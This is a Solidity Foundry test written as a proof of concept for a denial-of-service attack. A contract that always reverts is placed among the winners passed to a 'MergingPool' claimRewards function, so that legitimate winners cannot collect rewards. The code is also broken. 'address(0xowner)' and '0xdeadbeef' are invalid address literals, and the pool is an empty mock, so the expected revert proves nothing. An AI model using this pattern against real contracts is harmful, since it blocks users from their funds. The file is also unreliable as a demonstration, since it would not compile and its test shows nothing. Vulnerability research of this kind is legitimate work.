// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface MergingPool {
    function claimRewards(address[] calldata winners) external;
}

contract MaliciousWinner {
    function mintFromMergingPool() external pure {
        revert("Malicious revert");
    }
}

contract ExploitTest is Test {
    MergingPool mergingPool;
    MaliciousWinner maliciousWinner;
    address[] winners;

    function setUp() public {
        // Deploy the malicious winner contract
        maliciousWinner = new MaliciousWinner();

        // Assume mergingPool is already deployed and we have its address
        // For the sake of this test, we mock the interface
        mergingPool = MergingPool(address(0x123456)); // Replace with actual address if available

        // Set up the winners array with the malicious winner
        winners.push(address(maliciousWinner));
        winners.push(address(0xdeadbeef)); // Legitimate winner
    }

    function test_exploit() public {
        // Step 1: Impersonate the merging pool contract owner to set up the state
        vm.prank(address(0xowner)); // Replace with actual owner address if available

        // Step 2: Attempt to claim rewards with a malicious winner in the list
        vm.expectRevert("Malicious revert");
        mergingPool.claimRewards(winners);

        // Step 3: Assert that the legitimate winner cannot claim rewards due to the revert
        // This is demonstrated by the expectRevert above, which shows the DoS condition
    }
}